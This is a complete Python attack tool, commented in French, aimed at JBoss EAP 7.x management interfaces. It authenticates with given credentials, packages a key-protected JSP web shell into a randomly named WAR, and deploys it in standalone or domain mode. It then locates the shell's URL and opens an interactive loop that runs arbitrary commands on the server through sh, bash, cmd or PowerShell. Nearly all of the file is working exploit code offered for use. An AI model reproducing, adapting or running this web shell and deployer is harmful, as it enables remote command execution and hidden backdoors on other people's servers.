#!/usr/bin/env python3
"""
JBoss EAP 7.x - Auto WAR shell deployer + interactive shell // Need authentication
Usage: python3 jboss_pwn.py <mgmt_url> <user> <pass>

Exemple: python3 jboss_rce.py http://10.10.10.50:9990 admin admin
"""

import sys
import io
import json
import time
import zipfile
import argparse
import secrets
import requests
from requests.auth import HTTPDigestAuth
from urllib.parse import urlparse, quote

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
#  JSP Shell
# ============================================================
JSP_SHELL_TEMPLATE = r"""<%@ page import="java.util.*,java.io.*"%>
<%
    String authKey = "__AUTHKEY__";
    String provided = request.getParameter("k");
    if (provided == null || !provided.equals(authKey)) {
        response.setStatus(404);
        return;
    }

    String cmd = request.getParameter("cmd");
    String shell = request.getParameter("s");
    if (shell == null) shell = "auto";

    if (cmd != null) {
        response.setContentType("text/plain; charset=UTF-8");
        PrintWriter pw = response.getWriter();
        try {
            String os = System.getProperty("os.name").toLowerCase();
            String[] command;
            if (shell.equals("sh") || (shell.equals("auto") && !os.contains("win"))) {
                command = new String[]{"/bin/sh", "-c", cmd};
            } else if (shell.equals("bash")) {
                command = new String[]{"/bin/bash", "-c", cmd};
            } else if (shell.equals("cmd") || (shell.equals("auto") && os.contains("win"))) {
                command = new String[]{"cmd.exe", "/C", cmd};
            } else if (shell.equals("ps")) {
                command = new String[]{"powershell.exe", "-NoP", "-NonI", "-C", cmd};
            } else {
                command = new String[]{"/bin/sh", "-c", cmd};
            }

            Process p = Runtime.getRuntime().exec(command);
            BufferedReader stdout = new BufferedReader(new InputStreamReader(p.getInputStream()));
            BufferedReader stderr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            String line;
            while ((line = stdout.readLine()) != null) pw.println(line);
            while ((line = stderr.readLine()) != null) pw.println(line);
            p.waitFor();
            pw.flush();
        } catch (Exception e) {
            pw.println("ERR: " + e.getMessage());
        }
        return;
    }
%>
<html><body><pre>OK</pre></body></html>
"""

WEB_XML = """<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
         http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
         version="3.1">
    <welcome-file-list>
        <welcome-file>shell.jsp</welcome-file>
    </welcome-file-list>
</web-app>
"""


def build_war(jsp_filename, auth_key):
    jsp_content = JSP_SHELL_TEMPLATE.replace("__AUTHKEY__", auth_key)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("WEB-INF/web.xml", WEB_XML)
        z.writestr(jsp_filename, jsp_content)
    buf.seek(0)
    return buf.read()


# ============================================================
#  JBoss Deployer (EAP 7.x)
# ============================================================
class JBossDeployer:
    def __init__(self, mgmt_url, username, password, verify_ssl=False):
        self.mgmt_url = mgmt_url.rstrip('/')
        self.session = requests.Session()
        self.session.auth = HTTPDigestAuth(username, password)
        self.session.verify = verify_ssl
        parsed = urlparse(self.mgmt_url)
        self.host = parsed.hostname
        self.scheme = parsed.scheme

    def _post(self, payload, timeout=30):
        return self.session.post(
            f"{self.mgmt_url}/management",
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=timeout
        )

    def auth_and_info(self):
        print("[*] Authentification + recon...")
        r = self._post({"operation": "read-resource", "include-runtime": "true"})
        if r.status_code == 401:
            print("[-] Auth refusée (401)")
            return None
        if r.status_code != 200:
            print(f"[-] HTTP {r.status_code} : {r.text[:200]}")
            return None
        info = r.json().get("result", {})
        print(f"[+] Auth OK")
        print(f"    product         : {info.get('product-name')} {info.get('product-version')}")
        print(f"    release-version : {info.get('release-version')}")
        print(f"    launch-type     : {info.get('launch-type')}")
        return info

    def detect_mode(self, info):
        launch_type = (info.get("launch-type") or "").upper()
        if launch_type == "DOMAIN":
            r = self._post({"operation": "read-children-names", "child-type": "server-group"})
            groups = r.json().get("result", []) if r.status_code == 200 else []
            print(f"[+] Mode DOMAIN -- server-groups : {groups}")
            return "DOMAIN", groups
        print("[+] Mode STANDALONE")
        return "STANDALONE", None

    def upload_content(self, war_bytes, war_name):
        print(f"[*] Upload du WAR ({len(war_bytes)} octets)...")
        files = {"file": (war_name, war_bytes, "application/octet-stream")}
        r = self.session.post(f"{self.mgmt_url}/management/add-content", files=files)
        if r.status_code != 200:
            raise Exception(f"Upload HTTP {r.status_code} : {r.text[:300]}")
        data = r.json()
        if data.get("outcome") != "success":
            raise Exception(f"Upload : {data}")
        bv = data["result"]["BYTES_VALUE"]
        print(f"[+] BYTES_VALUE = {bv}")
        return bv

    def deploy(self, war_name, bytes_value, mode, server_groups=None):
        print(f"[*] Déploiement {war_name} (mode {mode})...")
        if mode == "STANDALONE":
            payload = {
                "content": [{"hash": {"BYTES_VALUE": bytes_value}}],
                "address": [{"deployment": war_name}],
                "operation": "add",
                "enabled": "true",
                "runtime-name": war_name
            }
        else:
            steps = [{
                "content": [{"hash": {"BYTES_VALUE": bytes_value}}],
                "address": [{"deployment": war_name}],
                "operation": "add",
                "runtime-name": war_name
            }]
            for sg in server_groups:
                steps.append({
                    "address": [{"server-group": sg}, {"deployment": war_name}],
                    "operation": "add",
                    "enabled": "true"
                })
            payload = {"operation": "composite", "address": [], "steps": steps}

        r = self._post(payload)
        try:
            data = r.json()
        except Exception:
            data = {"raw": r.text}
        if data.get("outcome") == "success":
            print("[+] Déploiement réussi")
            return True
        print(f"[-] Échec : {json.dumps(data, indent=2)[:500]}")
        return False

    def undeploy(self, war_name, mode, server_groups=None):
        print(f"[*] Undeploy de {war_name}...")
        if mode == "STANDALONE":
            r = self._post({"operation": "remove", "address": [{"deployment": war_name}]})
        else:
            steps = []
            for sg in (server_groups or []):
                steps.append({
                    "operation": "remove",
                    "address": [{"server-group": sg}, {"deployment": war_name}]
                })
            steps.append({"operation": "remove", "address": [{"deployment": war_name}]})
            r = self._post({"operation": "composite", "address": [], "steps": steps})

        try:
            ok = r.json().get("outcome") == "success"
        except Exception:
            ok = False
        print("[+] Undeploy OK" if ok else f"[-] Undeploy échec : {r.text[:200]}")
        return ok

    # --------------------------------------------------------
    # Récup port HTTP réel
    # --------------------------------------------------------
    def get_http_port(self):
        # STANDALONE: socket-binding-group standard-sockets
        r = self._post({
            "operation": "read-resource",
            "address": [
                {"socket-binding-group": "standard-sockets"},
                {"socket-binding": "http"}
            ],
            "include-runtime": "true"
        })
        if r.status_code == 200 and r.json().get("outcome") == "success":
            res = r.json().get("result", {})
            port = res.get("bound-port") or res.get("port")
            if port:
                try:
                    return int(port)
                except (TypeError, ValueError):
                    pass

        # Scan tous les groupes
        r = self._post({
            "operation": "read-children-names",
            "address": [],
            "child-type": "socket-binding-group"
        })
        if r.status_code == 200 and r.json().get("outcome") == "success":
            for grp in r.json().get("result", []):
                r2 = self._post({
                    "operation": "read-resource",
                    "address": [
                        {"socket-binding-group": grp},
                        {"socket-binding": "http"}
                    ],
                    "include-runtime": "true"
                })
                if r2.status_code == 200 and r2.json().get("outcome") == "success":
                    res = r2.json().get("result", {})
                    port = res.get("bound-port") or res.get("port")
                    if port:
                        try:
                            return int(port)
                        except (TypeError, ValueError):
                            pass
        print("[!] Port HTTP non trouvé, fallback 8080")
        return 8080

    # --------------------------------------------------------
    # Récup context-root du WAR fraîchement déployé
    # --------------------------------------------------------
    def get_context_root(self, war_name, retries=8, delay=2):
        print("[*] Recherche du context-root via management API...")
        for attempt in range(1, retries + 1):
            # M1: read-resource undertow subsystem du deployment
            r = self._post({
                "operation": "read-resource",
                "address": [
                    {"deployment": war_name},
                    {"subsystem": "undertow"}
                ],
                "include-runtime": "true"
            })
            if r.status_code == 200:
                data = r.json()
                if data.get("outcome") == "success" and isinstance(data.get("result"), dict):
                    ctx = data["result"].get("context-root")
                    if ctx:
                        return ctx.lstrip("/")

            # M2: scan tous les subsystems du deployment
            r = self._post({
                "operation": "read-children-names",
                "address": [{"deployment": war_name}],
                "child-type": "subsystem"
            })
            if r.status_code == 200 and r.json().get("outcome") == "success":
                for sub in r.json().get("result", []):
                    r2 = self._post({
                        "operation": "read-resource",
                        "address": [
                            {"deployment": war_name},
                            {"subsystem": sub}
                        ],
                        "include-runtime": "true",
                        "recursive": "true"
                    })
                    if r2.status_code == 200:
                        d2 = r2.json()
                        if d2.get("outcome") == "success" and isinstance(d2.get("result"), dict):
                            ctx = d2["result"].get("context-root")
                            if ctx:
                                return ctx.lstrip("/")

            # M3: domain - /host=*/server=*/deployment=...
            r = self._post({
                "operation": "read-children-names",
                "address": [],
                "child-type": "host"
            })
            if r.status_code == 200 and r.json().get("outcome") == "success":
                for host in r.json().get("result", []):
                    rs = self._post({
                        "operation": "read-children-names",
                        "address": [{"host": host}],
                        "child-type": "server"
                    })
                    if rs.status_code != 200:
                        continue
                    for srv in rs.json().get("result", []):
                        rd = self._post({
                            "operation": "read-resource",
                            "address": [
                                {"host": host},
                                {"server": srv},
                                {"deployment": war_name},
                                {"subsystem": "undertow"}
                            ],
                            "include-runtime": "true"
                        })
                        if rd.status_code == 200:
                            d = rd.json()
                            if d.get("outcome") == "success" and isinstance(d.get("result"), dict):
                                ctx = d["result"].get("context-root")
                                if ctx:
                                    return ctx.lstrip("/")

            print(f"[!] context-root indisponible (tentative {attempt}/{retries}), retry dans {delay}s...")
            time.sleep(delay)

        fallback = war_name[:-4] if war_name.endswith(".war") else war_name
        print(f"[!] Fallback context-root : /{fallback}")
        return fallback


# ============================================================
#  Shell interactif
# ============================================================
def interactive_shell(shell_url, auth_key, deployer, war_name, mode,
                      server_groups, verify_ssl=False):
    print("")
    print("=" * 65)
    print(f"[+] Shell URL : {shell_url}")
    print(f"[+] Auth key  : {auth_key}")
    print("=" * 65)
    print("Commandes spéciales :")
    print("  !shell sh|bash|cmd|ps|auto  -> change la shell")
    print("  !url                        -> affiche l'URL")
    print("  !raw <cmd>                  -> envoi raw sans pretty-print")
    print("  !clean                      -> undeploy le WAR et quitte")
    print("  !exit / !quit / Ctrl+D      -> quitter (sans cleanup)")
    print("=" * 65)

    sess = requests.Session()
    sess.verify = verify_ssl
    current_shell = "auto"

    try:
        r = sess.get(shell_url, params={"k": auth_key, "cmd": "echo SHELL_OK"}, timeout=15)
        if "SHELL_OK" in r.text:
            print("[+] Shell opérationnel\n")
        else:
            print(f"[!] Réponse inattendue (HTTP {r.status_code}) : {r.text[:200]}\n")
    except Exception as e:
        print(f"[-] Shell non joignable : {e}")
        return False

    cleaned = False
    while True:
        try:
            cmd = input(f"jboss({current_shell})$ ").strip()
        except (EOFError, KeyboardInterrupt):
            print("")
            break

        if not cmd:
            continue
        if cmd in ("!exit", "!quit", "exit", "quit"):
            break
        if cmd == "!clean":
            if deployer.undeploy(war_name, mode, server_groups):
                cleaned = True
            break
        if cmd == "!url":
            from urllib.parse import quote; print(f"{shell_url}?k={quote(auth_key)}&cmd=id"); print(f"[Template] {shell_url}?k={quote(auth_key)}&cmd=<CMD>&s={current_shell}")
            continue
        if cmd.startswith("!shell"):
            parts = cmd.split()
            if len(parts) == 2 and parts[1] in ("sh", "bash", "cmd", "ps", "auto"):
                current_shell = parts[1]
                print(f"[+] Shell : {current_shell}")
            else:
                print("Usage: !shell sh|bash|cmd|ps|auto")
            continue

        raw_mode = False
        if cmd.startswith("!raw "):
            raw_mode = True
            cmd = cmd[5:]

        try:
            r = sess.get(
                shell_url,
                params={"k": auth_key, "cmd": cmd, "s": current_shell},
                timeout=60
            )
            output = r.text
            print(output if raw_mode else output.rstrip())
        except requests.exceptions.Timeout:
            print("[-] Timeout (commande > 60s)")
        except Exception as e:
            print(f"[-] Erreur : {e}")

    return cleaned


# ============================================================
#  MAIN
# ============================================================
def main():
    parser = argparse.ArgumentParser(description="JBoss EAP 7.x WAR shell deployer")
    parser.add_argument("mgmt_url", help="URL management complète, ex: http://target:9990")
    parser.add_argument("user")
    parser.add_argument("password")
    parser.add_argument("--app-port", type=int, default=None,
                        help="Port HTTP app (default: auto-detect via mgmt API)")
    parser.add_argument("--app-host", default=None,
                        help="Host pour atteindre l'app (default: même que mgmt)")
    parser.add_argument("--war-name", default=None,
                        help="Nom du WAR (default: aléatoire)")
    parser.add_argument("--jsp-name", default="shell.jsp",
                        help="Nom du fichier JSP")
    parser.add_argument("--auth-key", default=None,
                        help="Clé d'auth du JSP (default: aléatoire)")
    parser.add_argument("--cleanup", action="store_true",
                        help="Undeploy automatique en sortie de shell")
    parser.add_argument("--insecure", action="store_true")
    args = parser.parse_args()

    rand = secrets.token_hex(4)
    war_name = args.war_name or f"app_{rand}.war"
    auth_key = args.auth_key or secrets.token_urlsafe(24)

    print(f"[*] WAR    : {war_name}")
    print(f"[*] JSP    : {args.jsp_name}")
    print(f"[*] AuthK  : {auth_key}")

    war_bytes = build_war(args.jsp_name, auth_key)

    deployer = JBossDeployer(args.mgmt_url, args.user, args.password,
                             verify_ssl=not args.insecure)
    info = deployer.auth_and_info()
    if not info:
        sys.exit(1)
    mode, server_groups = deployer.detect_mode(info)

    try:
        bv = deployer.upload_content(war_bytes, war_name)
    except Exception as e:
        print(f"[-] {e}")
        sys.exit(1)

    if not deployer.deploy(war_name, bv, mode, server_groups):
        sys.exit(1)

    # Port HTTP réel + context-root réel
    app_port = args.app_port or deployer.get_http_port()
    context_root = deployer.get_context_root(war_name)
    app_host = args.app_host or deployer.host

    shell_url = f"{deployer.scheme}://{app_host}:{app_port}/{context_root}/{args.jsp_name}"

    cleaned = False
    try:
        cleaned = interactive_shell(shell_url, auth_key, deployer, war_name,
                                    mode, server_groups,
                                    verify_ssl=not args.insecure)
    finally:
        if not cleaned:
            if args.cleanup:
                deployer.undeploy(war_name, mode, server_groups)
            else:
                print("")
                print(f"[!] WAR toujours déployé : {war_name}")
                print(f"    Relance avec --cleanup, ou utilise !clean dans le shell")


if __name__ == "__main__":
    main()
